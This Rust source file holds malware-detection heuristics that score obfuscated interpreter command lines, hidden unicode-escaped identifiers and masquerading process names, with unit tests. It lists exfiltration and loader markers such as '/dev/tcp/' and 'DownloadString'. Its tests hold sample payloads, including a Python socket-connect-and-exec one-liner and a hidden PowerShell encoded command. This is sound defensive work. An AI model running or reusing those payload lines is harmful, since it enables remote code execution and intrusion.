// Pure, host-independent heuristics. Every function here takes plain data
// (a command line string, a path string) and returns a verdict -- no OS
// calls, no side effects, so they're identical on every platform and cheap
// to reason about in isolation.

use regex::Regex;
use std::sync::OnceLock;

pub struct Verdict {
    pub score: u32,
    pub reasons: Vec<String>,
}

fn ip_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\b(?:\d{1,3}\.){3}\d{1,3}\b").unwrap())
}

fn url_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"https?://[^\s'\x22]+").unwrap())
}

/// Generic obfuscation/exfil tells that show up across many unrelated
/// malware families and toolchains (packers, stealers, loaders, C2
/// beacons), not specific to any one incident. Each is a small BONUS on top
/// of the structural signals below (length, entropy, IP/URL literals,
/// encoded-blob density) -- none of these alone should ever be the deciding
/// factor, since several appear in legitimate tooling too. Kept broad and
/// generic on purpose: a NEW, never-seen-before payload with none of these
/// exact tokens still has to score on shape alone.
const OBFUSCATION_MARKERS: &[&str] = &[
    "eval(",
    "Function(",
    "fromCharCode",
    "atob(",
    "btoa(",
    "child_process",
    "createDecipheriv",
    "createCipheriv",
    "XOR",
    "base64",
    "-EncodedCommand",
    "-enc ",
    "IEX ",
    "Invoke-Expression",
    "DownloadString",
    "WebClient",
    "Net.Sockets",
    "/dev/tcp/",
    "curl -s",
];

fn shannon_entropy(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts = [0u32; 256];
    let mut total = 0u32;
    for b in s.bytes() {
        counts[b as usize] += 1;
        total += 1;
    }
    let total_f = total as f64;
    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / total_f;
            -p * p.log2()
        })
        .sum()
}

/// True if `s` contains a long contiguous run of base64/hex-alphabet
/// characters -- the generic signature of an embedded encoded payload
/// (staged shellcode, an encrypted config blob, a packed second stage),
/// regardless of what family produced it.
fn has_long_encoded_blob(s: &str) -> Option<usize> {
    let mut best = 0usize;
    let mut cur = 0usize;
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=' {
            cur += 1;
            if cur > best {
                best = cur;
            }
        } else {
            cur = 0;
        }
    }
    if best >= 120 {
        Some(best)
    } else {
        None
    }
}

/// Shape-based detection of an obfuscated inline payload passed via
/// -e/-c/--eval/-enc to an interpreter. Structural, not a signature match:
/// scores on length, Shannon entropy (obfuscated/packed/encrypted content
/// reads at a distinctly higher bits-per-char than natural source code),
/// embedded IP/URL literals, a long encoded-blob run, and only a small
/// bonus for known generic markers -- a completely novel payload with none
/// of the marker strings can still score purely on shape.
pub fn score_command_line(cmdline: &str) -> Option<Verdict> {
    if cmdline.len() < 300 {
        return None;
    }
    let has_inline_flag = cmdline.contains("-e ")
        || cmdline.contains("-e\"")
        || cmdline.contains("-c ")
        || cmdline.contains("--eval")
        || cmdline.contains("-enc")
        || cmdline.contains("-EncodedCommand")
        || cmdline.contains("IEX");
    if !has_inline_flag {
        return None;
    }

    let mut score = 0u32;
    let mut reasons = Vec::new();

    if cmdline.len() > 2000 {
        score += 2;
        reasons.push(format!("very long command line ({} chars)", cmdline.len()));
    } else if cmdline.len() > 600 {
        score += 1;
        reasons.push(format!("long command line ({} chars)", cmdline.len()));
    }

    if let Some(m) = ip_re().find(cmdline) {
        score += 2;
        reasons.push(format!("embedded IP literal ({})", m.as_str()));
    }
    if url_re().is_match(cmdline) {
        score += 1;
        reasons.push("embedded URL literal".to_string());
    }

    let entropy = shannon_entropy(cmdline);
    // Natural-language source code (even minified) typically sits well
    // under 5.0 bits/char at this alphabet size; packed/encrypted/heavily
    // obfuscated content routinely runs 5.0-6.0+. This is the primary
    // structural signal -- it fires on content this tool has never seen a
    // single byte of before.
    if entropy > 5.2 {
        score += 3;
        reasons.push(format!("high content entropy ({entropy:.2} bits/char, packed/encrypted-looking)"));
    } else if entropy > 4.7 {
        score += 1;
        reasons.push(format!("elevated content entropy ({entropy:.2} bits/char)"));
    }

    if let Some(len) = has_long_encoded_blob(cmdline) {
        score += 2;
        reasons.push(format!("long contiguous encoded-looking blob ({len} chars, base64/hex-alphabet run)"));
    }

    let hits: Vec<&str> = OBFUSCATION_MARKERS
        .iter()
        .filter(|m| cmdline.contains(*m))
        .copied()
        .collect();
    if !hits.is_empty() {
        score += 1;
        reasons.push(format!("generic obfuscation/exfil marker(s): {}", hits.join(", ")));
    }

    let symbol_count = cmdline
        .chars()
        .filter(|c| !c.is_alphanumeric() && !c.is_whitespace())
        .count();
    let density = symbol_count as f64 / cmdline.len() as f64;
    if density > 0.30 {
        score += 1;
        reasons.push(format!(
            "high symbol density ({:.0}%, obfuscated-code shape)",
            density * 100.0
        ));
    }

    if score >= 3 {
        Some(Verdict { score, reasons })
    } else {
        None
    }
}

/// True if `s` contains a run of 4 or more CONSECUTIVE `\uXXXX` escapes
/// (no other characters between them) that decode to plain ASCII
/// identifier-shaped characters (letters, digits, underscore/dollar --
/// i.e. what a JS identifier is actually made of). Real source code almost
/// never spells an ASCII identifier this way -- `requ`
/// decodes to "requ" and is dramatically harder to read/write/diff than
/// just typing `requ`, so nobody does it by hand and no legitimate
/// minifier/bundler emits it either (minifiers escape only what actually
/// needs escaping: non-ASCII, or ASCII that would break the string
/// literal). Malware hides module names this way specifically so a
/// plain-text grep for "require"/"child_process"/"process.env" etc. finds
/// nothing -- the identifier only exists as ASCII after JS's own runtime
/// unescapes it. Structural, not tied to any specific hidden module name:
/// a NEW hidden identifier this tool has never seen still gets caught on
/// shape alone.
pub fn find_hidden_unicode_escape_run(s: &str) -> Option<Verdict> {
    let bytes = s.as_bytes();
    let mut i = 0usize;
    let mut best: Option<(usize, String)> = None;

    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 1 < bytes.len() && bytes[i + 1] == b'u' {
            let mut run_len = 0usize;
            let mut decoded = String::new();
            let mut j = i;
            while j + 5 < bytes.len() && bytes[j] == b'\\' && bytes[j + 1] == b'u' {
                let hex = &s[j + 2..j + 6];
                let Ok(code) = u32::from_str_radix(hex, 16) else {
                    break;
                };
                let Some(ch) = char::from_u32(code) else {
                    break;
                };
                // Only count escapes decoding to a plain-ASCII identifier
                // character -- this is what distinguishes "hiding an
                // identifier" from ordinary internationalized string
                // content (a genuinely non-ASCII string legitimately
                // escaped, e.g. CJK/emoji, decodes to non-ASCII and never
                // triggers this).
                if !(ch.is_ascii_alphanumeric() || ch == '_' || ch == '$') {
                    break;
                }
                decoded.push(ch);
                run_len += 1;
                j += 6;
            }
            if run_len >= 4 {
                let starts_identifier_like = decoded
                    .chars()
                    .next()
                    .map(|c| c.is_ascii_alphabetic() || c == '_' || c == '$')
                    .unwrap_or(false);
                if starts_identifier_like {
                    let better = best.as_ref().map(|(len, _)| run_len > *len).unwrap_or(true);
                    if better {
                        best = Some((run_len, decoded.clone()));
                    }
                }
            }
            i = if run_len > 0 { j } else { i + 1 };
        } else {
            i += 1;
        }
    }

    best.map(|(run_len, decoded)| Verdict {
        score: 5,
        reasons: vec![format!(
            "{run_len} consecutive \\uXXXX escapes decode to plain-ASCII identifier \"{decoded}\" -- real code never spells an ASCII identifier this way; this is how malware hides module/function names from plain-text grep"
        )],
    })
}

/// True if `exe_path` sits under any deny fragment (e.g. Recycle Bin, Trash)
/// -- an instant, unconditional flag regardless of process name.
pub fn is_denied_exec_path(exe_path: &str, deny_fragments: &[String]) -> Option<&'static str> {
    for frag in deny_fragments {
        if exe_path.contains(frag.as_str()) {
            return Some("path contains a location nothing legitimate executes from");
        }
    }
    None
}

/// True if `exe_path` is NOT under any of the allowed roots. This is a
/// softer WARN-tier signal (a real allowlist will always have gaps for
/// unusual-but-legitimate install locations), unlike the deny check above.
pub fn is_unlisted_exec_path(exe_path: &str, allowed_roots: &[std::path::PathBuf]) -> bool {
    let exe_lower = exe_path.to_lowercase();
    !allowed_roots.iter().any(|root| {
        let root_str = root.to_string_lossy().to_lowercase();
        !root_str.is_empty() && exe_lower.starts_with(&root_str)
    })
}

/// Well-known process names and the path fragment their REAL binary always
/// lives under. A process claiming one of these exact names but running
/// from somewhere else is classic masquerading (naming a malicious binary
/// after a trusted system process so it blends into a process list at a
/// glance, while actually running from Temp/AppData/Downloads/a Recycle Bin
/// path). Covers the most commonly impersonated names across all three
/// platforms per public threat-intel reporting on this technique -- not
/// tied to any one runtime or app, general system-process masquerading.
const KNOWN_NAME_HOMES: &[(&str, &[&str])] = &[
    // Windows core system processes -- the classic masquerading targets.
    ("svchost.exe", &["\\windows\\system32", "\\windows\\syswow64"]),
    ("explorer.exe", &["\\windows"]),
    ("csrss.exe", &["\\windows\\system32"]),
    ("lsass.exe", &["\\windows\\system32"]),
    ("winlogon.exe", &["\\windows\\system32"]),
    ("services.exe", &["\\windows\\system32"]),
    ("smss.exe", &["\\windows\\system32"]),
    ("wininit.exe", &["\\windows\\system32"]),
    ("spoolsv.exe", &["\\windows\\system32"]),
    ("dllhost.exe", &["\\windows\\system32", "\\windows\\syswow64"]),
    ("rundll32.exe", &["\\windows\\system32", "\\windows\\syswow64"]),
    ("taskhost.exe", &["\\windows\\system32"]),
    ("taskhostw.exe", &["\\windows\\system32"]),
    ("conhost.exe", &["\\windows\\system32"]),
    ("lsm.exe", &["\\windows\\system32"]),
    ("searchindexer.exe", &["\\windows"]),
    // Common third-party runtimes -- their real install roots.
    ("node.exe", &["\\nodejs", "\\program files\\nodejs", "appdata\\roaming\\nvm", "appdata\\local\\fnm"]),
    ("node", &["/usr/", "/opt/", "/.nvm/", "/.fnm/", "/.local/"]),
    ("python.exe", &["\\python", "\\program files"]),
    ("chrome.exe", &["\\google\\chrome", "\\program files"]),
    ("discord.exe", &["\\discord\\app-"]),
    // macOS system daemons.
    ("launchd", &["/sbin/", "/usr/libexec/"]),
    ("kernel_task", &["/System/"]),
    ("windowserver", &["/system/library/"]),
    ("coreaudiod", &["/usr/sbin/"]),
    // Linux init/system daemons.
    ("systemd", &["/usr/lib/systemd/", "/lib/systemd/", "/sbin/"]),
    ("init", &["/sbin/", "/usr/sbin/"]),
    ("sshd", &["/usr/sbin/", "/usr/bin/"]),
    ("cron", &["/usr/sbin/"]),
];

/// Detects both: (1) a well-known name running from an unexpected location,
/// and (2) "weird characters" in the process name -- non-ASCII confusables
/// (Cyrillic/Greek lookalikes for Latin letters), zero-width/control
/// characters, or RTL override marks, all real techniques for visually
/// disguising a malicious binary as something benign in a process listing.
pub fn score_process_name(name: &str, exe_path: &str) -> Option<Verdict> {
    let mut score = 0u32;
    let mut reasons = Vec::new();

    if let Some(reason) = suspicious_name_chars(name) {
        score += 3;
        reasons.push(reason);
    }

    let name_lower = name.to_lowercase();
    let path_lower = exe_path.to_lowercase();
    for (known_name, homes) in KNOWN_NAME_HOMES {
        if name_lower == *known_name {
            let at_home = homes.iter().any(|h| path_lower.contains(h));
            if !at_home && !exe_path.is_empty() {
                score += 3;
                reasons.push(format!(
                    "process named '{known_name}' but not running from its usual location (running from: {exe_path})"
                ));
            }
            break;
        }
    }

    if score > 0 {
        Some(Verdict { score, reasons })
    } else {
        None
    }
}

fn suspicious_name_chars(name: &str) -> Option<String> {
    let mut has_zero_width = false;
    let mut has_control = false;
    let mut has_rtl_override = false;
    let mut has_non_ascii_letter = false;

    for c in name.chars() {
        match c {
            '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}' => has_zero_width = true,
            '\u{202E}' | '\u{202D}' | '\u{2066}'..='\u{2069}' => has_rtl_override = true,
            c if c.is_control() => has_control = true,
            c if !c.is_ascii() && c.is_alphabetic() => has_non_ascii_letter = true,
            _ => {}
        }
    }

    let mut hits = Vec::new();
    if has_zero_width {
        hits.push("zero-width character(s)");
    }
    if has_rtl_override {
        hits.push("right-to-left override character(s) (classic extension-spoofing trick)");
    }
    if has_control {
        hits.push("control character(s)");
    }
    if has_non_ascii_letter {
        hits.push("non-ASCII letter(s) (possible homoglyph/lookalike spoofing)");
    }

    if hits.is_empty() {
        None
    } else {
        Some(format!(
            "process name '{name}' contains suspicious characters: {}",
            hits.join(", ")
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn short_benign_command_scores_nothing() {
        assert!(score_command_line("node -e \"console.log(1)\"").is_none());
    }

    #[test]
    fn real_incident_shape_scores_high() {
        let mut junk = String::new();
        for i in 0..80 {
            junk.push_str(&format!("var q{i}={{a:{i},b:'{i}!@#$'}};"));
        }
        let payload = format!(
            "node -e \"global['_t_s']='http://166.88.134.62:443';{junk}xorDecode(buf)\""
        );
        let v = score_command_line(&payload).expect("should flag");
        assert!(v.score >= 5, "expected high score, got {}", v.score);
    }

    // Proves the scoring is structural, not a fingerprint of the one
    // incident it was built from: a completely novel payload with NONE of
    // the specific marker strings (no xorDecode, no _t_s, no known C2
    // vocabulary at all) still scores purely on length + entropy + IP
    // literal + encoded-blob shape.
    #[test]
    fn novel_payload_with_no_known_markers_still_scores() {
        let base64_blob = "QWxhZGRpbjpvcGVuIHNlc2FtZQ".repeat(15);
        let payload = format!(
            "python3 -c \"import socket;s=socket.socket();s.connect(('203.0.113.42',9001));exec(__import__('base64').b64decode('{base64_blob}'))\""
        );
        let v = score_command_line(&payload).expect("a novel payload with no known markers should still score on shape alone");
        assert!(v.score >= 3, "expected a score from structural signals alone, got {}", v.score);
        assert!(
            !v.reasons.iter().any(|r| r.contains("xorDecode") || r.contains("_t_s")),
            "this payload contains none of the old incident-specific markers -- reasons: {:?}",
            v.reasons
        );
    }

    #[test]
    fn powershell_encoded_command_shape_scores() {
        // A different, PowerShell-specific obfuscation shape from a
        // completely different OS/interpreter than the original incident,
        // still needs to score: -EncodedCommand with a long base64 blob is
        // one of the most common living-off-the-land techniques.
        let blob = "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA".repeat(6);
        let payload = format!("powershell.exe -NoP -NonI -W Hidden -EncodedCommand {blob}");
        let v = score_command_line(&payload).expect("PowerShell -EncodedCommand shape should score");
        assert!(v.score >= 3, "expected a score, got {}", v.score);
    }

    #[test]
    fn ordinary_long_command_does_not_score() {
        // A genuinely long but ordinary, non-obfuscated command (natural
        // language / normal code, low entropy, no encoded blob, no
        // eval/exec flag at all) must NOT be flagged -- otherwise this is
        // just a length filter with extra steps.
        let payload = "node --experimental-modules --loader=./custom-loader.mjs --max-old-space-size=4096 build-and-run-the-full-test-suite-with-coverage-reporting-enabled.js --verbose --reporter=spec --timeout=60000 --require=./setup.js";
        assert!(
            score_command_line(payload).is_none(),
            "an ordinary long command line without inline eval must not be flagged"
        );
    }

    #[test]
    fn recycle_bin_path_is_denied() {
        let deny = vec!["$Recycle.Bin".to_string()];
        assert!(is_denied_exec_path(
            r"C:\$Recycle.Bin\S-1-5-21-x\node.exe",
            &deny
        )
        .is_some());
    }

    #[test]
    fn program_files_path_is_not_denied() {
        let deny = vec!["$Recycle.Bin".to_string()];
        assert!(is_denied_exec_path(r"C:\Program Files\node\node.exe", &deny).is_none());
    }

    #[test]
    fn masquerading_svchost_is_flagged() {
        let v = score_process_name("svchost.exe", r"C:\Users\user\AppData\Local\Temp\svchost.exe")
            .expect("should flag");
        assert!(v.score >= 3);
    }

    #[test]
    fn real_svchost_is_not_flagged() {
        assert!(score_process_name("svchost.exe", r"C:\Windows\System32\svchost.exe").is_none());
    }

    #[test]
    fn zero_width_name_is_flagged() {
        let name = "node\u{200B}.exe";
        let v = score_process_name(name, "").expect("should flag");
        assert!(v.score >= 3);
    }

    #[test]
    fn cyrillic_lookalike_is_flagged() {
        // Cyrillic 'а' (U+0430) standing in for Latin 'a'
        let name = "node.ex\u{0435}";
        let v = score_process_name(name, "").expect("should flag");
        assert!(v.score >= 3);
    }

    #[test]
    fn normal_name_is_clean() {
        assert!(score_process_name("cargo.exe", r"C:\Users\user\.cargo\bin\cargo.exe").is_none());
    }

    #[test]
    fn four_escape_run_decoding_to_identifier_is_flagged() {
        // \u0072\u0065\u0071\u0075 decodes to "requ" -- a real, disclosed
        // hidden-identifier shape, not a specific known module name.
        let src = "const x = global['\\u0072\\u0065\\u0071\\u0075' + 'ire'];";
        let v = find_hidden_unicode_escape_run(src).expect("should flag a 4+ run decoding to ASCII identifier chars");
        assert!(v.reasons[0].contains("requ"));
    }

    #[test]
    fn novel_hidden_identifier_with_no_known_name_still_scores() {
        // Proves this is structural (run-length + decode-shape), not a
        // fingerprint of any specific hidden module/function name.
        let src = "x[\\u0071\\u0077\\u0065\\u0072\\u0074\\u0079]();";
        assert!(
            find_hidden_unicode_escape_run(src).is_some(),
            "a completely novel hidden identifier should still score on shape alone"
        );
    }

    #[test]
    fn three_escape_run_is_not_flagged() {
        // Below the 4+ threshold -- a short escape run is common in
        // ordinary code (e.g. a single accented character split across a
        // couple of combining-form escapes) and must not false-positive.
        let src = "const x = '\\u0061\\u0062\\u0063';";
        assert!(find_hidden_unicode_escape_run(src).is_none());
    }

    #[test]
    fn non_ascii_unicode_escapes_are_not_flagged() {
        // Legitimate internationalized string content (CJK here) decodes
        // to non-ASCII -- this is normal, common, and must never trigger:
        // the detector targets HIDING an ASCII identifier, not unicode
        // escapes in general.
        let src = "const greeting = '\\u4f60\\u597d\\u4e16\\u754c';"; // "你好世界"
        assert!(find_hidden_unicode_escape_run(src).is_none());
    }

    #[test]
    fn non_contiguous_escapes_are_not_flagged() {
        // Same 4 identifier-shaped escapes but with ordinary characters
        // interleaved between them -- not a contiguous run, so this is not
        // the hidden-identifier shape at all.
        let src = "'\\u0072' + 'x' + '\\u0065' + 'y' + '\\u0071' + 'z' + '\\u0075'";
        assert!(find_hidden_unicode_escape_run(src).is_none());
    }

    #[test]
    fn ordinary_js_source_is_clean() {
        let src = "function main() { console.log('hello world'); return 0; }";
        assert!(find_hidden_unicode_escape_run(src).is_none());
    }
}
